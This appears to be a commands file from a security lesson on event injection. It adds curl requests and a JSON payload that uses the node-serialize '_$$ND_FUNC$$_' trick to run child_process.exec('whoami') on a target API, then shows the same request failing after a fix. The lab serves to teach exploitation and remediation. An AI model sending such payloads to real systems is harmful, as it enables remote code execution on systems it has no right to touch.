@@ -1,0 +1,38 @@
+
+---
+
+# 📄 `lesson-01-event-injection/commands.txt`
+
+```text id="l1cmds"
+# =========================
+# Normal Request
+# =========================
+curl -s -X POST "<API_URL>" \
+-H "Content-Type: application/json" \
+-d '{"action":"orders"}' | jq
+
+
+# =========================
+# Malicious Payload (RCE)
+# =========================
+# Save as payload.json
+
+{
+  "action": "_$$ND_FUNC$$_function (){require('child_process').exec('whoami', console.log)}()"
+}
+
+
+# =========================
+# Exploit Request
+# =========================
+curl -s -X POST "<API_URL>" \
+-H "Content-Type: application/json" \
+-d @payload.json | jq
+
+
+# =========================
+# After Fix (Should Fail)
+# =========================
+curl -s -X POST "<API_URL>" \
+-H "Content-Type: application/json" \
+-d @payload.json | jq
